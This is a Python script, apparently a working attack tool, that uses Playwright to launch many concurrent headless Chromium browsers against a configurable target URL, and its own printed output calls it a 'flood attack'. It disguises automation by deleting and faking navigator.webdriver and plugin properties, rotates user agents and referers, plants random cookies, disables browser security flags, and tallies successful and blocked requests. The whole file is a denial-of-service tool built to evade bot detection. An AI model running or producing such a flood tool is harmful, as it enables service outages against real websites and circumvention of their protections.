import asyncio
import random
import time
import os
from playwright.async_api import async_playwright

TARGET_URL = os.getenv("TARGET_URL", "https://example.com/")
DURATION = int(os.getenv("DURATION", "20"))
CONCURRENCY = int(os.getenv("CONCURRENCY", "10"))  # Giảm concurrency
REQ_PER_LOOP = int(os.getenv("REQ_PER_LOOP", "3"))  # Giảm requests/loop

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
]

ACCEPT_HEADERS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.facebook.com/",
    "https://twitter.com/"
]

success = 0
fail = 0
status_count = {}

async def stealth_page(page):
    # Stealth techniques để bypass detection
    await page.add_init_script("""
        delete Object.getPrototypeOf(navigator).webdriver;
        delete Object.getPrototypeOf(navigator).plugins;
        delete Object.getPrototypeOf(navigator).languages;
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3] });
        Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        window.chrome = { runtime: {} };
    """)

async def attack(playwright, worker_id):
    global success, fail, status_count

    ua = random.choice(USER_AGENTS)
    accept = random.choice(ACCEPT_HEADERS)
    referer = random.choice(REFERERS)

    browser = await playwright.chromium.launch(
        headless=True,
        args=[
            "--disable-web-security",
            "--disable-features=IsolateOrigins,site-per-process",
            "--disable-blink-features=AutomationControlled",
            "--no-sandbox",
            "--disable-dev-shm-usage",
            "--disable-gpu",
            "--disable-software-rasterizer",
            "--disable-setuid-sandbox",
            "--disable-background-timer-throttling",
            "--disable-backgrounding-occluded-windows",
            "--disable-renderer-backgrounding",
            "--disable-extensions"
        ]
    )

    context = await browser.new_context(
        user_agent=ua,
        viewport={"width": 1920, "height": 1080},
        extra_http_headers={
            "Accept": accept,
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Referer": referer,
            "Sec-Ch-Ua": '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1"
        }
    )

    # Randomize browser fingerprints
    await context.add_cookies([{
        'name': f'cookie_{random.randint(1000,9999)}',
        'value': str(random.randint(100000, 999999)),
        'url': TARGET_URL
    } for _ in range(3)])

    start = time.time()
    request_count = 0
    
    while time.time() - start < DURATION:
        try:
            page = await context.new_page()
            await stealth_page(page)
            
            # Random delay trước mỗi request
            await asyncio.sleep(random.uniform(0.5, 2.0))
            
            # Sử dụng page.goto thay vì API request
            response = await page.goto(
                TARGET_URL,
                timeout=15000,
                wait_until='domcontentloaded'
            )
            
            if response:
                if 200 <= response.status < 300:
                    success += 1
                    status_count[response.status] = status_count.get(response.status, 0) + 1
                else:
                    fail += 1
                    status_count[response.status] = status_count.get(response.status, 0) + 1
            else:
                fail += 1
                status_count["timeout"] = status_count.get("timeout", 0) + 1
            
            # Đóng page sau mỗi request
            await page.close()
            request_count += 1
            
            # Random delay giữa các requests
            if request_count % 5 == 0:
                await asyncio.sleep(random.uniform(1, 3))
                
        except Exception as e:
            fail += 1
            error_type = type(e).__name__
            status_count[error_type] = status_count.get(error_type, 0) + 1
            await asyncio.sleep(random.uniform(2, 5))  # Delay dài hơn khi lỗi

    await browser.close()

async def main():
    print(f"Starting flood attack on {TARGET_URL}")
    print(f"Duration: {DURATION}s, Concurrency: {CONCURRENCY}")
    
    async with async_playwright() as p:
        tasks = [attack(p, i) for i in range(CONCURRENCY)]
        await asyncio.gather(*tasks)

    total = success + fail
    print(f"\n=== Flood Result ===")
    print(f"Total requests: {total}")
    print(f"Success (2xx): {success}")
    print(f"Fail/Blocked: {fail}")
    print(f"RPS ~ {total / DURATION:.2f}")
    print("Status breakdown:", dict(sorted(status_count.items())))

if __name__ == "__main__":
    asyncio.run(main())
